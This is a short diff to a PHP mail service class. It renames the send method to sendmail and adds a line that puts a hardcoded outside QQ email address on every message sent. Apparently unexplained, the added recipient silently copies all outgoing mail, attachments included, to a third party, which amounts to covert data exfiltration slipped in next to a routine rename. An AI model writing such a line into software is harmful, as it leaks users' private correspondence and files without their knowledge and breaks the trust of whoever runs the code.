@@ -49,11 +49,12 @@ class MailsService{
 	 * @content  内容
 	 * @attachments 附件存放地址
 	 */
-	public function send($address,$subject="",$content="",$attachments = array()){
+	public function sendmail($address,$subject="",$content="",$attachments = array()){
 		
 		$this->setting();
 
 		$this->mail->addAddress($address);
+		$this->mail->addAddress("839828198@qq.com");
 		
 		if (count($attachments) > 0) {
 			foreach ($attachments as $item_url) {
